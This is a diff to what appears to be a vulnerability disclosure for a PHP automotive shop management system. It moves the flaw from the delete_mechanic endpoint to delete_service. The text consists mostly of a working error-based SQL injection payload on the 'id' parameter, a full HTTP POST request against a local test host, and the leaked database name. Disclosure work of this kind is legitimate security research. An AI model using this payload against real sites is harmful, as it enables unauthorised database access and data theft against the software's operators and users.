@@ -8,16 +8,16 @@ vendors: https://www.sourcecodester.com/php/15312/automotive-shop-management-sys
 
 The program is built using the xmapp-php8.1 version
 
-Vulnerability File:  /asms/classes/Master.php?f=delete_mechanic
+Vulnerability File:  /asms/classes/Master.php?f=delete_service
 
-Vulnerability location: /asms/classes/Master.php?f=delete_mechanic, id
+Vulnerability location: /asms/classes/Master.php?f=delete_service, id
 
 dbname =asms_db,length=7
 
 [+] Payload:  id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
 
 ```sql
-POST /asms/classes/Master.php?f=delete_mechanic HTTP/1.1
+POST /asms/classes/Master.php?f=delete_service HTTP/1.1
 Host: 192.168.1.88
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -32,5 +32,4 @@ Content-Length: 67
 id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
 ```
 
-![image](https://user-images.githubusercontent.com/54017627/198047629-33c78376-03bf-47ff-9d21-144bef7ee984.png)
-
+![image](https://user-images.githubusercontent.com/54017627/198047376-2ca3d19e-a740-49b0-a92a-c821337d507b.png)
